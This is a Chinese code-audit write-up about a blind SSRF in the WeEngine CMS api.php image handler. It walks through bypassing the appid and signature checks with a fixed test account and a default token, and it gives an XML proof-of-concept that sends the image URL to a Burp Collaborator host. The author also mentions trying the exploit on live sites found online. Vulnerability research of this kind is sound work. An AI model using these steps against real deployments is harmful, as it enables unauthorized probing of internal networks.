微擎最新版前台某处无回显SSRF漏洞
------------------

0x0 前言
------

 [代码审计之某通用商城系统getshell过程](https://mp.weixin.qq.com/s/rSP8LQJpIkP-Ahljkof5sA),续之前这篇文章v1.8.2版本，这次分享一个最新版v2.7.6 相对来说比较鸡肋的无回显SSRF，漏洞不是最主要的，主要是分享下自己的审计过程。

> 写文章还有补天的粽子领就很开心。

0x1 影响版本
--------

经过测试应该是通杀到最新版的，不过不同版本利用方式有些不同，下面将从v1.8.2版本开始分析然后过渡到v2.7.6版本，来构造出对应的POC。

0x2 漏洞点
-------

v1.8.2版本系统安装目录下的根目录文件: `api.php`

662 line:`analyzeImage`函数,直接将`$message['picurl']`传入`ihttp_get`函数,结合前篇我们文章的分析，这个函数是采用了`curl`请求并设置跟随的,如果我们可控`$message['picurl']`那么这里就会是一个支持任意协议，但是没回显的SSRF。

> 这个漏洞可玩性与[UEditor SSRF](https://paper.seebug.org/606/)差不多，不过这个属于Blind类型的。

![image-20210615163531485](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7fa72fafcabacd66b9efb59c08fa8ca5160d4223.png)

我们看一下,`$message`是否可控

![image-20210615164452887](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3829688d5d1ee2fdcd5e878b0caf6908478320a7.png)

可以看到在`start`函数里面获取了POST的内容然后进入`$this->account->parse`函数进行解析

251 line: 位于`/f ramework/class/account/account.class.php` 的`parse`函数

```php
    public function parse($message) {
        global $_W;
        if (!empty($message)){
            //解析内容
            $message = x ml2array($message);
            $packet = iarray_change_key_case($message, CASE_LOWER);
            $packet['from'] = $message['FromUserName'];
            $packet['to'] = $message['ToUserName'];
            $packet['time'] = $message['CreateTime'];
            $packet['type'] = $message['MsgType'];
            $packet['event'] = $message['Event'];
            switch ($packet['type']) {
                case 'text':
                    $packet['redirection'] = false;
                    $packet['source'] = null;
                    break;
                case 'image':
                    # 这里直接赋值PicUrl
                    $packet['url'] = $message['PicUrl'];
                    break;
        ....
        return $packet;
    }
```

跟进`x ml2array`,很简单就是解析x ml格式的内容,微擎官方文档[消息概述](https://www.kancloud.cn/donknap/we7/134649)里面就给出了使用案例。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bb730e8b0b1bd1239431181e5b2fb8ba423a6705.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bb730e8b0b1bd1239431181e5b2fb8ba423a6705.png)

到这里就可以确定`$message['picurl']`是直接从POST的数据包中提取然后没有任何过滤进入到`ihttp_get`函数的，从而造成了SSRF漏洞的。

下面就是如何进行漏洞的触发。

0x3 触发漏洞
--------

当我们访问`http://localhost:8887/wq2/wq2/api.php`，要确保能走进漏洞函数，首先就要先进入到`start()`函数。

![image-20210615170945120](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5b82001f23569a5195fd3602871a98dce5a50601.png)

这里需要绕过前面判断,其实也很简单。

```php
if(!empty($_GPC['appid'])) {
    $appid = ltrim($_GPC['appid'], '/');
    if ($appid == 'wx570bc396a51b8ff8') {
        $_W['account'] = array(
            'type' => '3',
            'key' => 'wx570bc396a51b8ff8',
            'level' => 4,
            'token' => 'platformtestaccount'
        );
    } else {
        $id = pdo_fetchcolumn("SELECT acid FROM " . tablename('account_wechats') . " WHERE `key` = :appid", array(':appid' => $appid));
    }
}
```

我们通过传入`api.php?appid=wx570bc396a51b8ff8`,便能成功构造出一个`$_W['account']`出来，绕过上面所说即如下的两个非空判断。

```php
if(empty($_W['account'])) {
    exit('initial error hash or id');
}
if(empty($_W['account']['token'])) {
    exit('initial missing token');
}
```

继续向下走，还需要绕过`$this->account->checkSign()`,继续跟进:

![image-20210615171407102](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f6b30998448e1e61082676c541965feb949556c8.png)

可以看到,这个Sign其实是固定的，所需要的3个信息分别为`$token, $_GET['timestamp'], $_GET['nonce']`,这里`$token`就是上面程序预留的信息值为：`platformtestaccount`,其他两个不传入留空值即可。

29 line:`framework/class/account/weixin.account.class.php` 的`checkSign`函数

![image-20210615171519590](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3df36415161eb73b70a109bfc3bac7d2aba00e49.png)

那么我们只要传入`signature=976a497ee3f68bc655ddcf4e7e7aab97d117ef0a`即可绕过`checkSign`函数。

然后回到`api.php`继续向下执行,182 line,对`$message`进行分析,跟进该函数。

```php
$pars = $this->analyze($message);
```

![image-20210615172420838](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-01c1b9122aa2080a0f6c456b479dcf3ff977c060.png)

最终就会进入我们上述漏洞点`analyzeImage`函数，造成SSRF。

0x4 POC 验证
----------

![image-20210615172743080](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-b9e3695988f633888bfc31da208a9b29274b4215.png)

可以看到构造如下格式，便可成功触发。

```php
<x ml>
<ToUserName><![CDATA[toUser]]></ToUserName>
<FromUserName><![CDATA[fromUser]]></FromUserName>
<CreateTime>12345678</CreateTime>
<MsgType><![CDATA[image]]></MsgType>
<picurl><![CDATA[http://ssrf.l3pekm70n3nb5y4hhtmopdlphgn9by.burpcollaborator.net/]]></picurl>
</x ml>
```

0x5 出现问题
--------

我简单看了一下Gitee上该系统的最新版2.7.6的代码[api.php](https://gitee.com/we7coreteam/pros/blob/master/api.php)，发现漏洞点还是存在的。

![image-20210615173107051](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-0b41391608adde7a85fa785382fa9dba1bed50da.png)

但是我在网上找了几个最新版的站打了下,发现并没有成功。

![image-20210615173234710](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a0f7652d5d907c6cda9087cf5db2d1d9d498b760.png)

尝试删减一些参数，可以得到原因是没进入`start`函数就结束了,通过debug发现问题主要是在

在初始化`$this->account = WeAccount::create($_W['account']);`时会调用到这个`getAccountInfo`函数，这里对内置的测试用户做了个判断，导致进入了`$this->openPlatformTestCase();`而这个函数最终都是走入了`exit()`，所以这里我们不能使用这个账户。

```php
    protected function getAccountInfo($uniacid) {
        //针对测试用户做了判断,$this->openPlatformTestCase();
        if ('wx570bc396a51b8ff8' == $this->account['key']) {
            $this->account['key'] = $this->appid;
            $this->openPlatformTestCase();
        }
        $account = table('account_wechats')->getAccount($uniacid);
        $account['encrypt_key'] = $this->appid;

        return $account;
    }
```

0x6 解决问题
--------

回到`api.php`

![image-20210615183229733](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-82be3d0f1c7d7f79d73e924c0daaccd3d0df3800.png)

可以看到除了测试用户,我们也可以通过传入`$id`来获取account，跟进`uni_fetch`函数。

![image-20210615184419904](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-882760bab896d8df4d37f660d4a898c82d1ae234.png)

查询account获取id=1的信息

![image-20210615184644694](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6412f051f43c429865263d822b3439ab2d80215b.png)

继续跟下去，最终你会发现token其实存储在了ims\_core\_cache表中，并且只有唯一一个，这个Token值是固定的。

> 这个信息是从`/data/db.php`获取的，也就是初始化的默认数据，刚好这个值不是随机生成的，所有版本都是一样的。

![image-20210615190136424](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-904bb4672ca821c42b5dd95a9b29c351ff140196.png)

相关调用栈如下:

![image-20210615190154149](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8131913600f0e584d3d7ac720e5d16ded6555460.png)

所以我们只要重新获取一下signature就行了，即如下

![image-20210615190418036](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-b91f4af981ec671af4affe4b86b870b43f2296f0.png)

0x7 新POC
--------

![image-20210615191418245](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3c5ca1231132d2321c4b5996d61a1e3f4bb0536f.png)

0x8 总结
------

 本文回顾了以前的文章，在此基础上对新版本进行类似漏洞的挖掘，遇到了版本差异导致的问题，尝试解决的时候，发现了关键的检验参数Token存在默认值，导致可以直接构造，完成了利用。最后，关于临时修复方案，账户是可以在后台进行删除的，步骤分别是"所有平台"-&gt;放入回收站-&gt;彻底删除，这样就可以避免猜测到Token值。